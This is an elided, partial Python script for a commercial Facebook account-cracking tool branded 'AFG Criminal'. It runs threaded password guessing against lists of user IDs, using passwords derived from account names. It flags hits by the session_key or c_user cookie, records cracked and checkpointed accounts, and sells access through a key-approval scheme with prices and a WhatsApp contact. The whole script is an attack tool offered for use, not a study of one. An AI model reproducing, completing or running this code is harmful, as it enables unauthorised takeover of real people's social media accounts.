...
os.system('clear')
print('         \x1b[38;5;46m WELCOME TO Criminal WORLD          ')
...
sys.stdout.write('\x1b]2; Mr: CRIMINAL\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
__________________________________________________
 ...
 \033[1;96m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;36mAFG Criminal  \033[1;96m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
──────────────────────────────────────────────────
\033[1;92m Owner   :            Khosti King
\033[1;92m Facebook:            Arman Khan 
\033[1;92m Github  :            Criminal 
\033[1;92m Version :            0.9
 ─────────────────────────────────────────────────
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        exit()
os.system("xd-open https://wa.me/qr/SI5U6B3VRKSDL1")
def menu():   
    os.system('clear')
    print(logo)
  ...
  ###  elif select =='2':
       ...
       os.system('xdg-open https://wa.me/qr/SI5U6B3VRKSDL1');menu()
    else:
        print('\n Select Wrong option ... ')
        time.sleep(2)
        NIX(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mArman-King-M1\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    break
                     ...
                     #print(f"\r\x1b[1;96m [criminal-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
...
'Content-Length': str(len(content_lenght))}
    ...
    def pasw(self):       
            ...
            print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            with SiamCriminal(max_workers=30) as criminalworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                Criminalworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                Criminalworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                Criminalworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                Criminalworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[criminal-OK] '+cid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[Criminal-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;92m[criminal]\033[1;92m] %s|\33[1;31m[OK]:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass 
############            
...
def main_apv():
    ...
    print(logo)
    uuid = str(os.geteuid())
    Khosti=('Nix1x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
    print(logo)
    os.system("clear");print(logo)
    print(f" Your Key : \x1b[1;31m"+Khosti)
    print("\x1b[1;92m--------------------------------------------------")
    try:
        ...
        if Khosti in system:
            ...
            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : Criminal Tools Can buy in all countries!')
            print('\033[1;92m-----------------------------------------------------\033[1;97m')
            print('\033[1;92m [\033[1;92m1\033[1;92m]\033[1;92m 230Afghani \033[1;92mApproval For 1 month')
            print(' \033[1;92m[\033[1;92m2\033[1;92m]\033[1;92m 180Afghani \033[1;92mApproval For 15 days')
            print(' \033[1;92m[\033[1;92m3\033[1;92m]\033[1;92m 100Afghani \033[1;92mApproval For 7 days \033[1;37m')
            print('\033[1;92m-----------------------------------------------------')
            Picchi = input(' Select Buy Option : ')
            os.system("clear")
            print(logo)
            print(f" \033[1;92mYour Key :\033[31;1m{Khosti}")
            ...
            tks = ("Hi criminal Sir, I Need To Buy Your criminal Tools Version 0.0.9 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Khosti+"\n Buy Select : "+Picchi)
